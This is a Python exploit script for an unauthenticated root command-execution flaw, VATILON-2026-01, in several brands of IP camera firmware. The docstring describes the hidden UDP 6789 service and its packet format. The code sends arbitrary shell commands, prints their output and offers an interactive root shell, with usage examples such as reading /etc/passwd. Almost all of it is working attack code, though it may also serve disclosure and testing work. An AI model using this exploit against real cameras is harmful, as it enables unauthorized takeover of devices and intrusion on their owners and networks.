#!/usr/bin/env python3
"""VATILON-2026-01 - unauthenticated root command execution over UDP 6789.

Vatilon/SIMICAM/KEVIEW/ASECAM/JIENUO IP camera firmware starts an undocumented
service, `system_wapper`, from /usr/app/run.sh on every boot. It binds UDP 6789
on all interfaces and hands any datagram it receives to /bin/sh as root.

Datagram format, recovered by disassembling the ARM binary:

    0..3   flag, little-endian.  0 = synchronous
    4..7   mode, little-endian.  nonzero = popen and return stdout
                                 zero    = execl, fire and forget
    8..    the command, NUL-terminated

The reply is a 4-byte little-endian return code followed by stdout, truncated
to roughly 10 KB by the daemon's own buffer.

Only run this against equipment you own or are authorized to test.

    ./vatilon_udp6789_rce.py 10.0.0.5                 # check: runs `id`
    ./vatilon_udp6789_rce.py 10.0.0.5 -c 'cat /etc/passwd'
    ./vatilon_udp6789_rce.py 10.0.0.5 --shell         # interactive
"""

import argparse
import socket
import struct
import sys

PORT = 6789
SYNC = 0
MODE_CAPTURE = 1


def send(host, port, command, timeout=3.0):
    """Send one command. Returns (returncode, stdout) or None on timeout."""
    pkt = struct.pack("<II", SYNC, MODE_CAPTURE) + command.encode() + b"\x00"
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    try:
        s.sendto(pkt, (host, port))
        reply = s.recv(65535)
    except socket.timeout:
        return None
    finally:
        s.close()
    if len(reply) < 4:
        return None
    return struct.unpack("<I", reply[:4])[0], reply[4:].decode(errors="replace")


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("host")
    ap.add_argument("-p", "--port", type=int, default=PORT)
    ap.add_argument("-c", "--command", default="id")
    ap.add_argument("-t", "--timeout", type=float, default=3.0)
    ap.add_argument("--shell", action="store_true", help="interactive command loop")
    args = ap.parse_args()

    if args.shell:
        print(f"[*] {args.host}:{args.port} - commands run as root. Ctrl-D to quit.")
        while True:
            try:
                cmd = input("# ")
            except EOFError:
                print()
                return 0
            if not cmd.strip():
                continue
            result = send(args.host, args.port, cmd, args.timeout)
            if result is None:
                print("[!] no reply", file=sys.stderr)
                continue
            rc, out = result
            sys.stdout.write(out)
            if rc:
                print(f"[rc={rc}]", file=sys.stderr)
        return 0

    result = send(args.host, args.port, args.command, args.timeout)
    if result is None:
        print(f"[-] {args.host}:{args.port} did not answer - not vulnerable, "
              f"filtered, or the device is down", file=sys.stderr)
        return 1
    rc, out = result
    print(f"[+] {args.host}:{args.port} executed the command as root (rc={rc})")
    sys.stdout.write(out)
    if not out.endswith("\n"):
        print()
    return 0


if __name__ == "__main__":
    sys.exit(main())
